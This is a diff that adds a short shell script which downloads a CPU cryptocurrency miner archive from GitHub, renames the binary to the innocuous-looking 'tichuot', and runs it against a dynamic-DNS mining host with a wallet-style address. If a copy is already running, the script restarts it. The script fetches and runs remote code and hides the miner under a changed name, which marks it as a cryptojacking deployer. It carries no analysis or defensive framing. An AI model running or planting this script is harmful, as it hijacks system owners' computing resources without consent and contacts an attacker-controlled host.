@@ -1,0 +1,15 @@
+if [ -f ${PWD}/tichuot ]; then
+    if pgrep -x "tichuot" > /dev/null
+then
+pkill tichuot
+./tichuot -F http://ohmygodguru.ddns.net:56789/0xf71f7a7f6f7711331a3e2749d57a9f743e4387ed/code 
+else
+./tichuot -F http://ohmygodguru.ddns.net:56789/0xf71f7a7f6f7711331a3e2749d57a9f743e4387ed/code     
+fi
+exit
+fi
+wget https://github.com/StupidmanTan/miner-cpu/raw/master/aquaminer-0.4-linux-amd64.zip
+unzip aquaminer-0.4-linux-amd64.zip
+mv aquaminer-0.4-linux-amd64 tichuot
+./tichuot -F http://ohmygodguru.ddns.net:56789/0xf71f7a7f6f7711331a3e2749d57a9f743e4387ed/code
+exit 0
